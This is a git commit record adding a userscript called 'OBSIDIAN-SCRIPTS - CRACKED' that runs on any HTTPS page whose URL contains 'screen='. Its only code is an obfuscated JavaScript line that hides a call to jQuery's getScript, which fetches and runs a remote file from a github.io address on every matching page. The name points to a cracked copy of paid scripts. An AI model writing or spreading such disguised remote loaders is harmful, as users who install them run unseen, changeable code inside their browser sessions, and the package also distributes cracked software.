e2acea4750463b9412e19ca1c7d7ffc3f6ba8721
cracked199 <gerenciaminox@gmail.com>
2024-08-13 01:05:34 -0300

    Create obs.user.js

---
+++ obs.user.js
@@ -0,0 +1,7 @@
+// ==UserScript==
+// @name         OBSIDIAN-SCRIPTS - CRACKED
+// @description  ...
+// @match        https://*/*screen=*
+// ==/UserScript==
+
+var _0xb4cf5f=_0xdc25;!function(r,t){for(var n=_0xdc25,a=_0x10f6();;)try{if(258792===-parseInt(n(273))/1*(-parseInt(n(284))/2)+-parseInt(n(277))/3*(-parseInt(n(283))/4)+parseInt(n(285))/5+-parseInt(n(278))/6*(-parseInt(n(276))/7)+parseInt(n(272))/8*(-parseInt(n(281))/9)+parseInt(n(286))/10*(-parseInt(n(279))/11)+-parseInt(n(282))/12*(-parseInt(n(280))/13))break;a.push(a.shift())}catch(r){a.push(a.shift())}}();var _0x4808=[_0xb4cf5f(274),_0xb4cf5f(275)];function _0xdc25(r,t){var n=_0x10f6();return(_0xdc25=function(r,t){return n[r-=272]})(r,t)}function _0x10f6(){var r=["2260786VUYVmX","2609633zOMmVC","279ILoRWZ","12IIbTaK","8jjECoU","2opppmF","680485HFNEqf","10JWGVfO","121184xrbLBA","460199YRYuvg","https://cracked199.github.io/shares/cracked.js","getScript","7xFaCar","6243yQJWfo","796242AEuSZT"];return(_0x10f6=function(){return r})()}$[_0x4808[1]](_0x4808[0]);
